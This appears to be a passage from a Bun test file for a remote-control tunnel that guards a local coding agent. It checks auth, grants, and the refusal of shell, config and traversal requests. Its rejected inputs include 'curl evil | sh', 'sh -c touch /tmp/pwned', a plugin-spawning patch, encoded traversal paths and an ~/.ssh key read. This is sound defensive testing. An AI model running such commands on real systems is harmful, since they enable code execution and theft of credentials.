import { afterEach, describe, expect, test } from "bun:test"
import { GRANT_EXPIRED, GRANT_TTL_MS, grantTtlFromEnv, RemoteTunnel, SignedOutError, checkRemotePath, checkRemoteDirectory, checkRemoteParts, remoteModelSession, remoteSessionRef, SESSION_CHECK_FAILED, SESSION_CHECK_HEADER, keepGlobalEvent, filterEventStream, DIRECTORY_REFUSED, MODE_REFUSED, PARTS_REFUSED, SUBTASK_REFUSED, projectWorktreeFolder, type RemoteStatus } from "../../src/remote/tunnel"
import { PERMISSION_MODE_RULES } from "@opencode-ai/core/permission/mode"
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs"
import os from "node:os"
import nodePath from "node:path"
import { pathToFileURL } from "node:url"
import { fakePhoneVerifier, uidOf } from "../../src/remote/verify"
import { relayConfig } from "../../src/remote"

// A stub relay: accepts /v1/agent sockets, records frames, lets the test push frames.
function stubRelay() {
  const sockets: any[] = []
  const frames: any[] = []
  const waiters: Array<{ match: (f: any) => boolean; resolve: (f: any) => void }> = []
  const auths: string[] = []
  const server = Bun.serve({
    port: 0,
    hostname: "127.0.0.1",
    fetch(req, srv) {
      const url = new URL(req.url)
      auths.push(req.headers.get("authorization") ?? "")
      if (srv.upgrade(req, { data: { key: url.searchParams.get("key") } } as any)) return undefined
      return new Response("no", { status: 400 })
    },
    websocket: {
      open(ws) {
        sockets.push(ws)
        ws.send(JSON.stringify({ t: "welcome", key: (ws.data as any).key }))
      },
      message(ws, msg) {
        const f = { ...JSON.parse(String(msg)), _ws: ws }
        const i = waiters.findIndex((w) => w.match(f))
        if (i >= 0) waiters.splice(i, 1)[0].resolve(f)
        else frames.push(f)
      },
      close(ws) {
        const i = sockets.indexOf(ws)
        if (i >= 0) sockets.splice(i, 1)
      },
    },
  })
  const next = (match: (f: any) => boolean, ms = 3000) => {
    const i = frames.findIndex(match)
    if (i >= 0) return Promise.resolve(frames.splice(i, 1)[0])
    return new Promise<any>((resolve, reject) => {
      const timer = setTimeout(() => reject(new Error("timeout")), ms)
      waiters.push({ match, resolve: (f) => (clearTimeout(timer), resolve(f)) })
    })
  }
  return { url: `http://127.0.0.1:${server.port}`, sockets, frames, next, auths, stop: () => server.stop(true) }
}

async function collect(relay: ReturnType<typeof stubRelay>, id: string) {
  const head = await relay.next((f) => f.id === id && (f.t === "res" || f.t === "error"))
  let body = ""
  if (head.t === "res") {
    for (;;) {
      const f = await relay.next((x) => x.id === id && (x.t === "data" || x.t === "end" || x.t === "error"))
      if (f.t !== "data") break
      body += Buffer.from(f.data, "base64").toString()
    }
  }
  return { status: head.status, headers: head.headers, body }
}

let relay: ReturnType<typeof stubRelay> | undefined
let tunnel: RemoteTunnel | undefined
afterEach(() => {
  tunnel?.stop()
  relay?.stop()
  tunnel = relay = undefined
})

function make(opts: Partial<ConstructorParameters<typeof RemoteTunnel>[0]> = {}) {
  relay = stubRelay()
  const statuses: RemoteStatus[] = []
  const seen: Request[] = []
  // 22 Nov (audit 13): the tunnel's own PATCH that puts the computer's permission mode on a session, kept apart
  // from the phone's requests in `seen` (a phone request that sets `permission` is refused before dispatch)
  const applied: Array<{ path: string; body: any; headers: Headers }> = []
  // 24 Nov: the tunnel's own lookup of a named session's folder (sessionFolder). Every session lives in the project
  // folder unless `folders` says otherwise (null = no such session, "fail" = the server answers 500).
  const lookups: string[] = []
  const folders: Record<string, string | null | "fail"> = {}
  const answerLookup = (req: Request) => {
    const id = new URL(req.url).pathname.split("/").pop()!
    lookups.push(id)
    const f = id in folders ? folders[id] : "/tmp/praex-cli"
    if (f === null) return Response.json({ error: "not found" }, { status: 404 })
    if (f === "fail") return Response.json({ error: "boom" }, { status: 500 })
    return Response.json({ id, directory: f })
  }
  const inner = opts.dispatch
  tunnel = new RemoteTunnel({
    relayUrl: relay.url,
    link: "praex.ai/rc",
    dispatch: async (req) => {
      const text = req.method === "POST" || req.method === "PATCH" ? await req.text() : ""
      if (req.method === "PATCH" && text.includes('"permission"')) {
        applied.push({ path: new URL(req.url).pathname + new URL(req.url).search, body: JSON.parse(text), headers: req.headers })
        return Response.json(true)
      }
      seen.push(req)
      const body = req.method === "POST" ? text : ""
      return Response.json({ path: new URL(req.url).pathname + new URL(req.url).search, method: req.method, body })
    },
    credential: async () => ({ token: "test:alice", uid: "alice" }),
    verifyPhone: fakePhoneVerifier,
    meta: () => ({ name: "laptop", directory: "praex-cli", title: "Fix the build" }),
    scope: () => ({ roots: ["/tmp/praex-cli"] }),
    onStatus: (s) => statuses.push(s),
    ...opts,
  })
  // the lookup is answered first, whatever dispatch the test gave
  const opt = (tunnel as any).opts
  const given = inner ?? opt.dispatch
  opt.dispatch = async (req: Request) => (req.headers.get(SESSION_CHECK_HEADER) ? answerLookup(req) : given(req))
  return { relay, tunnel, statuses, seen, applied, lookups, folders }
}

describe("RemoteTunnel", () => {
  test("connects out with the user's token and says hello", async () => {
    const { relay, tunnel, statuses } = make()
    await tunnel.start()
    const hello = await relay.next((f) => f.t === "hello")
    expect(hello).toMatchObject({ name: "laptop", directory: "praex-cli", title: "Fix the build" })
    expect(relay.auths[0]).toBe("Bearer test:alice")
    expect(statuses.at(-1)).toMatchObject({ state: "on", link: "praex.ai/rc", key: tunnel.key })
    expect(tunnel.key.length).toBeGreaterThanOrEqual(22)
  })

  test("grants only to a phone token for the same uid", async () => {
    const { relay, tunnel } = make()
    await tunnel.start()
    const ws = relay.sockets[0]
    ws.send(JSON.stringify({ t: "attach", id: "a1", idToken: "test:bob" }))
    expect((await relay.next((f) => f.id === "a1")).t).toBe("denied")
    ws.send(JSON.stringify({ t: "attach", id: "a2", idToken: "test:alice" }))
    const ok = await relay.next((f) => f.id === "a2")
    expect(ok.t).toBe("attached")
    expect(ok.grant.length).toBeGreaterThanOrEqual(40)
  })

  test("serves requests with a valid grant or same-uid token, refuses the rest", async () => {
    const { relay, tunnel, seen } = make()
    await tunnel.start()
    const ws = relay.sockets[0]
    ws.send(JSON.stringify({ t: "attach", id: "a", idToken: "test:alice" }))
    const { grant } = await relay.next((f) => f.id === "a")

    const body = Buffer.from('{"text":"hi"}').toString("base64")
    ws.send(JSON.stringify({ t: "req", id: "r1", method: "POST", path: "/session/x/message?directory=/tmp/praex-cli", headers: { "content-type": "application/json" }, body, auth: { grant } }))
    const r1 = await collect(relay, "r1")
    expect(r1.status).toBe(200)
    expect(JSON.parse(r1.body)).toEqual({ path: "/session/x/message?directory=/tmp/praex-cli", method: "POST", body: '{"text":"hi"}' })
    expect(seen[0].headers.get("content-type")).toBe("application/json")

    ws.send(JSON.stringify({ t: "req", id: "r2", method: "GET", path: "/session", headers: {}, auth: { grant: "forged".padEnd(43, "x") } }))
    expect((await collect(relay, "r2")).status).toBe(401)
    ws.send(JSON.stringify({ t: "req", id: "r3", method: "GET", path: "/session", headers: {}, auth: { idToken: "test:bob" } }))
    expect((await collect(relay, "r3")).status).toBe(401)
    ws.send(JSON.stringify({ t: "req", id: "r4", method: "GET", path: "/session", headers: {}, auth: { idToken: "test:alice" } }))
    expect((await collect(relay, "r4")).status).toBe(200)
    ws.send(JSON.stringify({ t: "req", id: "r5", method: "GET", path: "/session", headers: {} }))
    expect((await collect(relay, "r5")).status).toBe(401)
  })

  test("terminal endpoints and odd paths are refused", async () => {
    const { relay, tunnel } = make()
    await tunnel.start()
    const ws = relay.sockets[0]
    ws.send(JSON.stringify({ t: "req", id: "p1", method: "POST", path: "/pty", headers: {}, auth: { idToken: "test:alice" } }))
    expect((await collect(relay, "p1")).status).toBe(403)
    ws.send(JSON.stringify({ t: "req", id: "p2", method: "GET", path: "//evil.example/x", headers: {}, auth: { idToken: "test:alice" } }))
    expect((await collect(relay, "p2")).status).toBe(400)
  })

  test("dot segments, encodings and the session shell can not reach the host", async () => {
    const { relay, tunnel, seen } = make()
    await tunnel.start()
    const ws = relay.sockets[0]
    const refused = [
      "/./pty",
      "/session/../pty",
      "/session/%2e%2e/pty",
      "/%70ty",
      "/%2570ty",
      "/api/pty",
      "/session/x/shell",
      "/session/ses_1/shell/",
      "/session/x/./shell?directory=%2Ftmp",
      "/session/x/%73hell",
      "/session/x%2F..%2Fy/shell",
    ]
    for (const [i, path] of refused.entries()) {
      ws.send(JSON.stringify({ t: "req", id: `b${i}`, method: "POST", path, headers: {}, auth: { idToken: "test:alice" } }))
      expect({ path, status: (await collect(relay, `b${i}`)).status }).toEqual({ path, status: 403 })
    }
    ws.send(JSON.stringify({ t: "req", id: "bs", method: "GET", path: "/\\evil.example/x", headers: {}, auth: { idToken: "test:alice" } }))
    expect((await collect(relay, "bs")).status).toBe(400)
    expect(seen).toHaveLength(0)

    ws.send(JSON.stringify({ t: "req", id: "ok", method: "GET", path: "/session/x/../y/message?directory=/tmp/praex-cli", headers: {}, auth: { idToken: "test:alice" } }))
    const ok = await collect(relay, "ok")
    expect(ok.status).toBe(200)
    // the request served is the normalised one that was checked
    expect(JSON.parse(ok.body).path).toBe("/session/y/message?directory=/tmp/praex-cli")
  })

  // 10-20: config writes over Remote Control, end to end through the frame handler
  test("config writes are refused over the wire, config reads still pass", async () => {
    const { relay, tunnel, seen } = make()
    await tunnel.start()
    const ws = relay.sockets[0]
    const b64 = (v: unknown) => Buffer.from(JSON.stringify(v)).toString("base64")
    const send = (id: string, method: string, path: string, body?: unknown) =>
      ws.send(JSON.stringify({ t: "req", id, method, path, headers: { "content-type": "application/json" }, body: body === undefined ? undefined : b64(body), auth: { idToken: "test:alice" } }))
    const mcpLocal = { name: "x", config: { type: "local", command: ["sh", "-c", "touch /tmp/pwned"] } }
    const refused: Array<[string, string, unknown?]> = [
      ["patch", "/config", { mcp: { x: mcpLocal.config } }],
      ["PATCH", "/global/config", { formatter: { x: { command: ["sh"] } } }],
      ["PUT", "/api/config", {}],
      ["POST", "/mcp", mcpLocal],
      ["PATCH", "/project/prj_1", { name: "p", commands: { start: "curl evil | sh" } }],
      ["POST", "/experimental/worktree", { startCommand: "sh -c id" }],
      ["PUT", "/auth/evil", { type: "wellknown", key: "K", token: "t" }],
    ]
    for (const [i, [method, path, body]] of refused.entries()) {
      send(`c${i}`, method, path, body)
      const res = await collect(relay, `c${i}`)
      expect({ method, path, status: res.status }).toEqual({ method, path, status: 403 })
      expect(JSON.parse(res.body).error).toContain("only be changed on the computer")
    }
    expect(seen).toHaveLength(0)

    send("g1", "GET", "/config")
    expect((await collect(relay, "g1")).status).toBe(200)
    send("g2", "POST", "/mcp/x/connect")
    expect((await collect(relay, "g2")).status).toBe(200)
    send("g3", "PATCH", "/project/prj_1", { name: "renamed", commands: { start: "" } })
    expect((await collect(relay, "g3")).status).toBe(200)
    expect(seen.map((r) => `${r.method} ${new URL(r.url).pathname}`)).toEqual([
      "GET /config",
      "POST /mcp/x/connect",
      "PATCH /project/prj_1",
    ])
  })

  // 11-13: patch apply, project reload, session/workspace moves and upgrade, end to end
  test("patch apply, reload, moves and upgrade are refused over the wire, reads still pass", async () => {
    const { relay, tunnel, seen } = make()
    await tunnel.start()
    const ws = relay.sockets[0]
    const b64 = (v: unknown) => Buffer.from(JSON.stringify(v)).toString("base64")
    const send = (id: string, method: string, path: string, body?: unknown) =>
      ws.send(JSON.stringify({ t: "req", id, method, path, headers: { "content-type": "application/json" }, body: body === undefined ? undefined : b64(body), auth: { idToken: "test:alice" } }))
    const plugin = "--- /dev/null\n+++ b/.opencode/plugins/x.ts\n@@ -0,0 +1 @@\n+Bun.spawn(['touch','/tmp/pwned'])\n"
    const refused: Array<[string, string, unknown?]> = [
      ["POST", "/vcs/apply", { patch: plugin }],
      ["post", "/vcs/apply?directory=%2Ftmp", { patch: plugin }],
      ["POST", "/instance/dispose"],
      ["POST", "/experimental/control-plane/move-session", { sessionID: "ses_1", destination: { directory: "/tmp" } }],
      ["POST", "/experimental/workspace", { type: "worktree", branch: null }],
      ["POST", "/experimental/workspace/warp", { id: null, sessionID: "ses_1", copyChanges: true }],
      ["DELETE", "/experimental/workspace/wrk_1"],
      ["POST", "/global/upgrade", { target: "0.0.1" }],
    ]
    for (const [i, [method, path, body]] of refused.entries()) {
      send(`h${i}`, method, path, body)
      const res = await collect(relay, `h${i}`)
      expect({ method, path, status: res.status }).toEqual({ method, path, status: 403 })
      expect(JSON.parse(res.body).error).toContain("only be done on the computer")
    }
    expect(seen).toHaveLength(0)

    send("v1", "GET", "/vcs/diff")
    expect((await collect(relay, "v1")).status).toBe(200)
    send("v2", "GET", "/experimental/workspace")
    expect((await collect(relay, "v2")).status).toBe(200)
    send("v3", "POST", "/session/x/message", { parts: [] })
    expect((await collect(relay, "v3")).status).toBe(200)
    expect(seen.map((r) => `${r.method} ${new URL(r.url).pathname}`)).toEqual([
      "GET /vcs/diff",
      "GET /experimental/workspace",
      "POST /session/x/message",
    ])
  })

  test("streams a long response and stops it on cancel", async () => {
    let cancelled = false
    const { relay, tunnel } = make({
      dispatch: async () =>
        new Response(
          new ReadableStream({
            start(c) {
              c.enqueue(new TextEncoder().encode("data: one\n\n"))
            },
            cancel() {
              cancelled = true
            },
          }),
          { headers: { "content-type": "text/event-stream" } },
        ),
    })
    await tunnel.start()
    const ws = relay.sockets[0]
    ws.send(JSON.stringify({ t: "req", id: "s1", method: "GET", path: "/global/event", headers: {}, auth: { idToken: "test:alice" } }))
    const head = await relay.next((f) => f.id === "s1" && f.t === "res")
    expect(head.headers["content-type"]).toBe("text/event-stream")
    const chunk = await relay.next((f) => f.id === "s1" && f.t === "data")
    expect(Buffer.from(chunk.data, "base64").toString()).toBe("data: one\n\n")
    ws.send(JSON.stringify({ t: "cancel", id: "s1" }))
    await Bun.sleep(50)
    expect(cancelled).toBe(true)
  })

  test("reconnects with the same key when the relay drops the socket", async () => {
    const { relay, tunnel, statuses } = make()
    await tunnel.start()
    const key = tunnel.key
    await relay.next((f) => f.t === "hello")
    relay.sockets[0].close(1011, "gone")
    const second = await relay.next((f) => f.t === "hello", 5000)
    expect(second).toBeTruthy()
    expect(statuses.some((s) => s.state === "reconnecting")).toBe(true)
    expect(statuses.at(-1)).toMatchObject({ state: "on", key })
  })

  test("rotates make-before-break and closes the old socket", async () => {
    const { relay, tunnel } = make({ rotateMs: 150, drainMs: 2000 })
    await tunnel.start()
    await relay.next((f) => f.t === "hello")
    const second = await relay.next((f) => f.t === "hello", 3000)
    expect(second).toBeTruthy()
    await Bun.sleep(100)
    // the old socket had nothing in flight, so it closed right away; one socket remains
    expect(relay.sockets.length).toBe(1)
    expect(tunnel.current.state).toBe("on")
  })

  test("pushes a refreshed token", async () => {
    let n = 0
    const { relay, tunnel } = make({
      credential: async () => ({ token: n++ < 2 ? "test:alice" : "test:alice2", uid: "alice" }),
      tokenCheckMs: 50,
    })
    await tunnel.start()
    const f = await relay.next((x) => x.t === "token", 2000)
    expect(f.token).toBe("test:alice2")
  })

  test("signed out: start fails with a plain sentence", async () => {
    const { tunnel } = make({
      credential: async () => {
        throw new SignedOutError()
      },
    })
    await expect(tunnel.start()).rejects.toThrow("praex login")
  })

  test("grants expire and need a fresh attach; stop revokes every grant", async () => {
    let clock = 1_000_000
    const { relay, tunnel } = make({ grantTtlMs: 60_000, now: () => clock })
    await tunnel.start()
    const ws = relay.sockets[0]
    ws.send(JSON.stringify({ t: "attach", id: "a", idToken: "test:alice" }))
    const { grant } = await relay.next((f) => f.id === "a")
    const ask = async (id: string, g: string) => {
      ws.send(JSON.stringify({ t: "req", id, method: "GET", path: "/session", headers: {}, auth: { grant: g } }))
      return collect(relay, id)
    }
    expect((await ask("r1", grant)).status).toBe(200)
    clock += 60_001
    const late = await ask("r2", grant)
    expect(late.status).toBe(401)
    expect(JSON.parse(late.body).error).toBe(GRANT_EXPIRED)
    // a fresh attach with a valid phone token is approved again
    ws.send(JSON.stringify({ t: "attach", id: "b", idToken: "test:alice" }))
    const { grant: again } = await relay.next((f) => f.id === "b")
    expect((await ask("r3", again)).status).toBe(200)
    // Remote Control off: the grant is gone (a restarted tunnel never honours it)
    tunnel.stop()
    expect(await (tunnel as any).authorized({ grant: again })).toBe(false)
  })

  test("grant lifetime is configurable with PRAEX_RC_GRANT_HOURS", () => {
    expect(grantTtlFromEnv({})).toBe(GRANT_TTL_MS)
    expect(GRANT_TTL_MS).toBe(12 * 60 * 60 * 1000)
    expect(grantTtlFromEnv({ PRAEX_RC_GRANT_HOURS: "2" })).toBe(2 * 60 * 60 * 1000)
    expect(grantTtlFromEnv({ PRAEX_RC_GRANT_HOURS: "nope" })).toBe(GRANT_TTL_MS)
    expect(grantTtlFromEnv({ PRAEX_RC_GRANT_HOURS: "-1" })).toBe(GRANT_TTL_MS)
  })

  test("stop turns everything off and forgets grants", async () => {
    const { relay, tunnel, statuses } = make()
    await tunnel.start()
    tunnel.stop()
    await Bun.sleep(50)
    expect(relay.sockets.length).toBe(0)
    expect(statuses.at(-1)).toEqual({ state: "off" })
  })
})

// Accepts the agent socket but never sends welcome (a hung relay or a proxy that swallows frames).
function silentRelay() {
  let opened = 0
  let closed = 0
  const server = Bun.serve({
    port: 0,
    hostname: "127.0.0.1",
    fetch(req, srv) {
      if (srv.upgrade(req, { data: {} } as any)) return undefined
      return new Response("no", { status: 400 })
    },
    websocket: {
      open() {
        opened++
      },
      message() {},
      close() {
        closed++
      },
    },
  })
  return {
    url: `http://127.0.0.1:${server.port}`,
    opened: () => opened,
    closed: () => closed,
    stop: () => server.stop(true),
  }
}

async function until(check: () => boolean, ms = 3000) {
  const end = Date.now() + ms
  while (!check()) {
    if (Date.now() > end) throw new Error("timeout")
    await Bun.sleep(10)
  }
}

describe("RemoteTunnel handshake deadline", () => {
  let silent: ReturnType<typeof silentRelay> | undefined
  let t: RemoteTunnel | undefined
  afterEach(() => {
    t?.stop()
    silent?.stop()
    t = silent = undefined
  })

  function makeSilent(opts: Partial<ConstructorParameters<typeof RemoteTunnel>[0]> = {}) {
    silent = silentRelay()
    const statuses: RemoteStatus[] = []
    const logs: string[] = []
    t = new RemoteTunnel({
      relayUrl: silent.url,
      link: "praex.ai/rc",
      dispatch: async () => new Response("unused"),
      credential: async () => ({ token: "test:alice", uid: "alice" }),
      verifyPhone: fakePhoneVerifier,
      meta: () => ({ name: "laptop", directory: "praex-cli" }),
      scope: () => ({ roots: ["/tmp/praex-cli"] }),
      onStatus: (s) => statuses.push(s),
      log: (line) => logs.push(line),
      ...opts,
    })
    return { silent, tunnel: t, statuses, logs }
  }

  test("a relay that never welcomes is closed at the deadline and goes to the retry path", async () => {
    const { silent, tunnel, statuses, logs } = makeSilent({ welcomeMs: 200 })
    const started = Date.now()
    await tunnel.start()
    expect(Date.now() - started).toBeLessThan(2000)
    expect(logs.some((l) => l.includes("first connect failed") && l.includes("no welcome"))).toBe(true)
    expect(statuses.at(-1)).toMatchObject({ state: "reconnecting", key: tunnel.key })
    await until(() => silent.closed() >= 1)
    // the retry opens a fresh socket, which hits the same deadline and is closed too
    await until(() => silent.opened() >= 2)
    await until(() => silent.closed() >= 2)
  })

  test("stop() cancels a handshake still waiting for welcome", async () => {
    const { silent, tunnel, statuses } = makeSilent()
    const starting = tunnel.start()
    await until(() => silent.opened() === 1)
    const stopped = Date.now()
    tunnel.stop()
    await starting
    expect(Date.now() - stopped).toBeLessThan(1000)
    await until(() => silent.closed() === 1)
    expect(statuses.at(-1)).toEqual({ state: "off" })
    // no retry is scheduled after stop (the first retry would fire after 250 ms)
    await Bun.sleep(400)
    expect(silent.opened()).toBe(1)
    expect(statuses.at(-1)).toEqual({ state: "off" })
  })
})

describe("checkRemotePath", () => {
  const status = (path: unknown) => {
    const r = checkRemotePath(path)
    return r.ok ? 200 : r.status
  }

  test("terminal and shell routes are refused however they are spelled", () => {
    for (const path of [
      "/pty",
      "/pty/",
      "/pty?x=1",
      "/pty/abc/connect",
      "/PTY",
      "/./pty",
      "/session/../pty",
      "/a/b/../../pty",
      "/session/%2e%2e/pty",
      "/session/.%2E/pty",
      "/%70ty",
      "/%70%74%79",
      "/%2570ty",
      "/%2fpty",
      "/x/..//pty",
      "/api/pty",
      "/api/pty/abc",
      "/api/../pty",
      "/session/x/shell",
      "/session/x/shell/",
      "/session/x//shell",
      "/session/x/shell?directory=%2Ftmp",
      "/session/x/%73hell",
      "/session/x/sh%65ll",
      "/session/x/shell%3Fq",
      "/session/x%2F..%2Fy/shell",
      "/api/session/x/shell",
    ])
      expect({ path, status: status(path) }).toEqual({ path, status: 403 })
  })

  test("odd paths are refused as bad", () => {
    for (const path of ["", "session", "//evil.example/x", "/\\evil.example/x", "/%E0%A4%A", undefined, 42])
      expect({ path, status: status(path) }).toEqual({ path, status: 400 })
  })

  test("normal routes pass, normalised", () => {
    expect(checkRemotePath("/session")).toEqual({ ok: true, url: "http://opencode.internal/session" })
    expect(checkRemotePath("/session/ses_1/message?directory=%2Ftmp")).toEqual({
      ok: true,
      url: "http://opencode.internal/session/ses_1/message?directory=%2Ftmp",
    })
    expect(checkRemotePath("/session/a/../b/prompt_async")).toEqual({ ok: true, url: "http://opencode.internal/session/b/prompt_async" })
    for (const path of ["/event", "/global/event", "/session/x/shells", "/session/x/message", "/ptyx", "/file/content?path=pty", "/find/file?query=shell", "/file/100%2525"])
      expect({ path, status: status(path) }).toEqual({ path, status: 200 })
  })

  // 10-20: config writes (method aware, and body aware where the route has ordinary uses too)
  const json = (v: unknown) => new TextEncoder().encode(JSON.stringify(v))
  const statusOf = (method: string, path: string, body?: Uint8Array) => {
    const r = checkRemotePath(path, method, body)
    return r.ok ? 200 : r.status
  }

  test("config writes are refused on every config route, however they are spelled", () => {
    const paths = [
      "/config",
      "/config/",
      "/config?directory=%2Ftmp",
      "/CONFIG",
      "/%63onfig",
      "/%2563onfig",
      "/session/../config",
      "/x/..//config",
      "/api/config",
      "/api/config/",
      "/global/config",
      "/global//config",
      "/global/%2e%2e/global/config",
      "/api/global/config",
      "/config/providers",
    ]
    for (const method of ["PATCH", "PUT", "POST", "DELETE", "PURGE"])
      for (const path of paths) expect({ method, path, status: statusOf(method, path) }).toEqual({ method, path, status: 403 })
  })

  test("adding an MCP server is refused (its config may be a local command)", () => {
    for (const path of ["/mcp", "/mcp/", "/api/mcp", "/%6dcp", "/session/../mcp", "/mcp?directory=%2Ftmp"])
      expect({ path, status: statusOf("POST", path, json({ name: "x", config: { type: "local", command: ["sh"] } })) }).toEqual({
        path,
        status: 403,
      })
  })

  test("reading config and toggling an already configured MCP server still pass", () => {
    for (const path of ["/config", "/config/providers", "/api/config", "/global/config", "/mcp"])
      for (const method of ["GET", "HEAD", "OPTIONS"]) expect({ method, path, status: statusOf(method, path) }).toEqual({ method, path, status: 200 })
    expect(checkRemotePath("/config", "GET")).toEqual({ ok: true, url: "http://opencode.internal/config" })
    for (const path of ["/mcp/x/connect", "/mcp/x/disconnect", "/mcp/x/auth"])
      expect({ path, status: statusOf("POST", path) }).toEqual({ path, status: 200 })
    for (const path of ["/configx", "/session/x/config", "/mcpx", "/session/x/message"])
      expect({ path, status: statusOf("POST", path, json({ parts: [] })) }).toEqual({ path, status: 200 })
  })

  test("project edit: name and icon pass, a startup script is refused", () => {
    expect(statusOf("PATCH", "/project/prj_1", json({ name: "p", icon: { color: "red" } }))).toBe(200)
    expect(statusOf("PATCH", "/project/prj_1", json({ name: "p", commands: { start: "" } }))).toBe(200)
    expect(statusOf("PATCH", "/project/prj_1", json({ name: "p", commands: { start: "  " } }))).toBe(200)
    expect(statusOf("PATCH", "/project/prj_1", json({ commands: { start: "make dev" } }))).toBe(403)
    expect(statusOf("PATCH", "/project/prj_1/", json({ commands: { start: "make dev" } }))).toBe(403)
    expect(statusOf("PATCH", "/%70roject/prj_1", json({ commands: { start: "make dev" } }))).toBe(403)
    // duplicate keys: JSON.parse keeps the last one, as the server does
    expect(statusOf("PATCH", "/project/prj_1", new TextEncoder().encode('{"commands":{"start":""},"commands":{"start":"x"}}'))).toBe(403)
    expect(statusOf("PATCH", "/project/prj_1", new TextEncoder().encode("{not json"))).toBe(400)
    expect(statusOf("GET", "/project/prj_1/directories")).toBe(200)
  })

  test("worktree create: passes without a startCommand, refused with one", () => {
    expect(statusOf("POST", "/experimental/worktree")).toBe(200)
    expect(statusOf("POST", "/experimental/worktree", json({ name: "w" }))).toBe(200)
    expect(statusOf("POST", "/experimental/worktree", json({ name: "w", startCommand: "id" }))).toBe(403)
    expect(statusOf("POST", "/experimental/worktree/", json({ startCommand: "id" }))).toBe(403)
    // 16 Nov (audit 11): reset runs git reset --hard, git clean and the start script: host only
    expect(statusOf("POST", "/experimental/worktree/reset", json({ directory: "/tmp/w" }))).toBe(403)
  })

  test("provider auth: API keys and OAuth pass, a well-known config source is refused", () => {
    expect(statusOf("PUT", "/auth/openai", json({ type: "api", key: "sk-1" }))).toBe(200)
    expect(statusOf("PUT", "/auth/openai", json({ type: "oauth", refresh: "r", access: "a", expires: 1 }))).toBe(200)
    expect(statusOf("PUT", "/auth/evil", json({ type: "wellknown", key: "K", token: "t" }))).toBe(403)
    expect(statusOf("PUT", "/auth/evil", json({ key: "K" }))).toBe(403)
    expect(statusOf("PUT", "/auth/evil", new TextEncoder().encode('{"type":"api","type":"wellknown"}'))).toBe(403)
    expect(statusOf("DELETE", "/auth/openai")).toBe(200)
    expect(statusOf("GET", "/provider/auth")).toBe(200)
  })

  // 11-13: writes that go around the permission prompts, refused for any non-read method
  test("patch apply, reload, session and workspace moves and upgrade are refused, however they are spelled", () => {
    const paths = [
      "/vcs/apply",
      "/vcs/apply/",
      "/vcs/apply?directory=%2Ftmp",
      "/VCS/Apply",
      "/vcs/%61pply",
      "/vcs/%2561pply",
      "/vcs//apply",
      "/session/../vcs/apply",
      "/vcs/x/../apply",
      "/api/vcs/apply",
      "/instance/dispose",
      "/instance/dispose?directory=%2Ftmp",
      "/%69nstance/dispose",
      "/x/..//instance/dispose",
      "/experimental/control-plane/move-session",
      "/experimental/control-plane/",
      "/experimental/%63ontrol-plane/move-session",
      "/experimental/workspace",
      "/experimental/workspace/",
      "/experimental/workspace/warp",
      "/experimental/workspace/sync-list",
      "/experimental/workspace/wrk_1",
      "/experimental//workspace",
      "/experimental/worktree/../workspace",
      "/global/upgrade",
      "/global/upgrade/",
      "/global/%75pgrade",
      "/api/global/upgrade",
    ]
    for (const method of ["POST", "PUT", "PATCH", "DELETE", "PURGE"])
      for (const path of paths) expect({ method, path, status: statusOf(method, path) }).toEqual({ method, path, status: 403 })
    const r = checkRemotePath("/vcs/apply", "POST", json({ patch: "" }))
    expect(r).toEqual({ ok: false, status: 403, message: "This can only be done on the computer, not over Remote Control." })
  })

  test("vcs, workspace and global reads, and neighbouring writes, still pass", () => {
    for (const path of ["/vcs", "/vcs/status", "/vcs/diff", "/vcs/diff/raw", "/experimental/workspace", "/experimental/workspace/status", "/experimental/workspace/adapter", "/global/health", "/path"])
      for (const method of ["GET", "HEAD", "OPTIONS"]) expect({ method, path, status: statusOf(method, path) }).toEqual({ method, path, status: 200 })
    for (const path of ["/vcs/applyx", "/vcs/diff", "/instance/disposex", "/experimental/workspaces", "/global/upgrades", "/session/x/message", "/session/x/prompt_async", "/permission/per_1/reply", "/session/x/abort"])
      expect({ path, status: statusOf("POST", path, json({ parts: [] })) }).toEqual({ path, status: 200 })
  })
})

describe("config and tokens", () => {
  test("relay must be https unless it is on this machine; fake auth only on loopback", () => {
    expect(relayConfig({}).url).toStartWith("https://")
    expect(() => relayConfig({ PRAEX_RELAY_URL: "http://relay.example" })).toThrow()
    expect(relayConfig({ PRAEX_RELAY_URL: "http://127.0.0.1:9000", PRAEX_RC_FAKE_AUTH: "1" }).fake).toBe(true)
    expect(relayConfig({ PRAEX_RELAY_URL: "https://relay.example", PRAEX_RC_FAKE_AUTH: "1" }).fake).toBe(false)
  })
  test("uidOf reads user_id from a JWT payload", () => {
    const p = Buffer.from(JSON.stringify({ user_id: "u9", sub: "u9" })).toString("base64url")
    expect(uidOf(`x.${p}.y`)).toBe("u9")
    expect(uidOf("test:alice", true)).toBe("alice")
    expect(uidOf("test:alice")).toBeUndefined()
  })
})

describe("16 Nov audit 11: host-only worktree, copy and dispose routes; directories pinned to the project", () => {
  const status = (m: string, p: string, b?: unknown) => {
    const r = checkRemotePath(p, m, b === undefined ? undefined : new TextEncoder().encode(JSON.stringify(b)))
    return r.ok ? 200 : r.status
  }
  test("removing a worktree, resetting one, copying a project and disposing everything are refused", () => {
    expect(status("DELETE", "/experimental/worktree", { directory: "/home/u/.ssh" })).toBe(403)
    expect(status("DELETE", "/experimental/worktree/")).toBe(403)
    expect(status("POST", "/experimental/worktree/reset", { directory: "/tmp/w" })).toBe(403)
    expect(status("POST", "/experimental/project/prj_1/copy", {})).toBe(403)
    expect(status("POST", "/global/dispose")).toBe(403)
    expect(status("POST", "/api/global/dispose")).toBe(403)
    // still open: creating a worktree without a start command, and reading the worktree list
    expect(status("POST", "/experimental/worktree", { name: "w" })).toBe(200)
    expect(status("GET", "/experimental/worktree")).toBe(200)
  })
  test("a request may only name the project folder, a folder inside it, or a worktree folder", () => {
    const root = "/home/u/proj"
    // 17 Nov (audit 12 A12-02): the project's own worktree folder, not the machine-wide one
    const trees = "/home/u/.local/share/praex/worktree/prj_1"
    const ok = (url: string, headers?: Record<string, string>) => checkRemoteDirectory("http://opencode.internal" + url, headers, root, trees)
    expect(ok("/session")).toBe(true)
    expect(ok("/session?directory=%2Fhome%2Fu%2Fproj")).toBe(true)
    expect(ok("/file/content?directory=/home/u/proj/sub&path=a.ts")).toBe(true)
    expect(ok("/session?directory=/home/u/.local/share/praex/worktree/prj_1/w1")).toBe(true)
    expect(ok("/file/content?directory=/home/u/.ssh&path=id_ed25519")).toBe(false)
    expect(ok("/file/content?directory=/home/u/proj/../.ssh")).toBe(false)
